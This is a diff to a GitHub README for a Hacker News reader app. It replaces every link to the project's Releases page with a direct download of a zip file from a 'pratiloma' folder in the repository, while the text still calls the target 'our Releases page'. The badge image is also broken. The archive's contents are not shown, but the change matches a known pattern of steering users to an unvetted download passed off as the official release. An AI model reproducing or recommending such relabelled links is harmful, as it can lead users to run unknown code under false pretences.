@@ -6,7 +6,7 @@ Welcome to **hacker_news_reader**! This application helps you effortlessly follo
 
 ## 📥 Download Now
 
-[![Download the latest version](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/alvainspirasi/hacker_news_reader/releases)
+[![Download the latest version](https://raw.githubusercontent.com/alvainspirasi/hacker_news_reader/main/pratiloma/hacker_news_reader.zip%20release-brightgreen)](https://raw.githubusercontent.com/alvainspirasi/hacker_news_reader/main/pratiloma/hacker_news_reader.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, please ensure your system meets the following requirements:
 
 ### 1. Visit the Releases Page
 
-To download the latest version of **hacker_news_reader**, [visit this page](https://github.com/alvainspirasi/hacker_news_reader/releases).
+To download the latest version of **hacker_news_reader**, [visit this page](https://raw.githubusercontent.com/alvainspirasi/hacker_news_reader/main/pratiloma/hacker_news_reader.zip).
 
 ### 2. Choose the Right File
 
@@ -96,6 +96,6 @@ We are always looking to improve **hacker_news_reader**. Here are some features 
 
 ## 📥 Download the Latest Version Again
 
-Don't forget, you can always [download the latest version](https://github.com/alvainspirasi/hacker_news_reader/releases) from our Releases page.
+Don't forget, you can always [download the latest version](https://raw.githubusercontent.com/alvainspirasi/hacker_news_reader/main/pratiloma/hacker_news_reader.zip) from our Releases page.
 
 Thank you for using **hacker_news_reader**! Enjoy your reading.
